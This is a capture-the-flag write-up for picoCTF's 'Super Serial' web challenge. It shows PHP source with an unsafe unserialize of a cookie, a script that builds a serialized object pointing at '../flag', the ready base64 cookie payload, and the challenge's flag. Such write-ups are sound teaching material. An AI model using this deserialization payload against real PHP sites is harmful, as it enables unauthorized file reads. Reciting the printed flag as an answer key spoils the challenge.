# Super Serial

## Problem Statement

Try to recover the flag stored on this website http://mercury.picoctf.net:5428/

## Type

Web Exploitation

## Hints

1.The flag is at ../flag

## Approach

On getting the list of files in the directory I see there's a robots.txt file which disallows ```admin.phps```, phps is the source file.
Trief visiting admin.phps but the page didnt exist. So I tried ```index.phps```.

In ```index.phps``` there are 2 file names, cookie.php and authentication.php.

In cookie.php we see a funtion for password verification.
```
if(isset($_COOKIE["login"])){
	try{
		$perm = unserialize(base64_decode(urldecode($_COOKIE["login"])));
		$g = $perm->is_guest();
		$a = $perm->is_admin();
	}
	catch(Error $e){
		die("Deserialization error. ".$perm);
	}
}
```

only if we input the correct value for the cookie ```login``` we'll get the deserialized output otherwise it throws an error.

In ```authentication.phps```  there's another function

```
class access_log
{
	public $log_file;

	function __construct($lf) {
		$this->log_file = $lf;
	}

	function __toString() {
		return $this->read_log();
	}

	function append_to_log($data) {
		file_put_contents($this->log_file, $data, FILE_APPEND);
	}

	function read_log() {
		return file_get_contents($this->log_file);
	}
}
```

On running the following code in a php sandbox, I got the contents of ```../flag``` file

```
<?php

class access_log
{
	public $log_file = "../flag";
}
print(urlencode(base64_encode(serialize(new access_log))))
?>
```

adding a cookie named "login" with value "TzoxMDoiYWNjZXNzX2xvZyI6MTp7czo4OiJsb2dfZmlsZSI7czo3OiIuLi9mbGFnIjt9" we get our flag. 


## Flag

picoCTF{th15_vu1n_1s_5up3r_53r1ous_y4ll_c5123066}